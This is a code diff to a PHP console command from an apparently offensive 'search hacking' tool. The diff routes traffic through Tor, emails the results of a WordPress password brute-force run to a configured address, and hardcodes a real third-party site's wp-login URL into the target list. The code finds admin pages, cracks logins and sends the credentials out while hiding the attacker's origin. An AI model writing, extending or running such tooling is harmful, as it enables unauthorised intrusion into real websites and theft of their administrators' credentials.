@@ -13,6 +13,7 @@ use Symfony\Component\Console\Input\InputDefinition;
 use Symfony\Component\Console\Helper\Table;
 use Aszone\SearchHacking\SearchHacking;
 use Aszone\Vulnerabilities;
+use Aszone\ProxyAvenger\Proxies;
 use Aszone\Avenger\Mailer;
 use Aszone\Hacking\DefaultSite;
 use Aszone\Exploits;
@@ -123,6 +124,11 @@ class SearchHackingEngine extends Command
         $this->validParamns($input, $output);
 
         $filterProxy = array();
+
+        if($this->torl){
+            $torl= new Proxies();
+            $this->torl=$torl->getTor();
+        }
 
         $commandData = array(
             'dork' => $this->dork,
@@ -298,6 +304,27 @@ class SearchHackingEngine extends Command
         }
     }
 
+    protected function sendMailBtResult($resultFinal)
+    {
+        //Send Mail with parcial results
+        $mailer = new Mailer();
+        if (empty($resultFinal)) {
+            $mailer->sendMessage('you@example.com', 'Fail, not finder password in list. =\\');
+        } else {
+            $msg = 'PHP Avenger Informer final, list of SUCCESS:<br><br>';
+            foreach ($resultFinal as $keyResultEnginer => $resultEnginer) {
+                foreach ($resultEnginer as $keyResult => $results) {
+                    foreach($results as $keyResult=>$result){
+                        $msg .= $keyResult.' '.$result.' <br>';
+                    }
+                    echo $msg;
+                    $mailer->sendMessage($this->email, $msg);
+                }
+            }
+
+        }
+    }
+
     protected function createNameFile()
     {
         return $this->getName().'_'.date('m-d-Y_hia');
@@ -366,6 +393,7 @@ class SearchHackingEngine extends Command
             $site = new DefaultSite($commandData, $result);
             $resultFinal['isAdmin']="http://www.riojurua.com.br/wp-login.php";
             $resultFinal['isAdmin'] = $site->check();
+            array_unshift($resultFinal['isAdmin'],"http://www.riojurua.com.br/wp-login.php");
             $this->saveTxt($resultFinal, $nameFileIsAdmin);
             $this->printResult($resultFinal, $output, 'Result list of admin page:');
             $this->printResumeResult($output, 'Patch File of admin page:', $nameFileIsAdmin);
@@ -442,11 +470,20 @@ class SearchHackingEngine extends Command
                 $output->writeln("<info><info>Password: ".$resBtwp['isAdmin']['password']."</info>");
                 $output->writeln('<info>********************************************************</info>');
                 if (!empty($this->email)) {
-                    $this->sendMail($resBtwp, $this->email);
+                    $this->sendMailBtResult($resBtwp, $this->email);
                     $this->printResumeResult($output, 'Email to send:', $this->email);
                 }
             }
         }
 
+    }
+
+    private function setTor($tor = '127.0.0.1:9050')
+    {
+        $this->tor = $tor;
+        return ['proxy' => [
+            'http' => 'socks5://127.0.0.1:9050',
+            'https' => 'socks5://127.0.0.1:9050',
+        ]];
     }
 }
